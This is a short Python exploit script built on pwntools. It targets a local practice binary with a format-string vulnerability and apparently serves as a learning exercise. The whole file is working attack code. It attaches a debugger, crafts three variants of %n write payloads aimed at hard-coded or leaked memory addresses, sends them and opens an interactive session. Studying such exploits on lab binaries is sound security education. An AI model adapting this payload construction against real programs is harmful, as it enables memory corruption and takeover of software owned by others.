#! /usr/bin/python
from pwn import *
from sys import *

context.terminal=['tmux', 'splitw', '-h']

io = process('./format_string_vulnerability')
elf = ELF('./format_string_vulnerability')

gdb.attach(io, 'b 9')
c_addr = io.recv()
print(c_addr)
payload=''

p6 = lambda addr:bytes.decode(p64(addr), encoding='iso8859-1')

if argv[1]=='a':
    payload = 'a' * 2 + '%8$n' + 'a'*2 + p6(0x601048) + p6(0x601048)
    pass
if argv[1]=='b':
    payload = 'a'*5 + '%305419891c' +  '%10$n' + 'a'*3 + p6(0x601044) + p6(0x601044)
    pass
if argv[1]=='c':
    payload = 'a' * 16 + '%10$n' + 'a'*3 + p6(int(c_addr[2:], 16)) + p6(int(c_addr[2:], 16)) # 0xx0016 00在高位
    #payload = p64(int(c_addr[2:], 16)) + '%10$n'
    pass
print(hex(elf.got['puts']))
io.sendline(payload)

result=io.recv()
print(result)
print(len(result))

io.interactive()
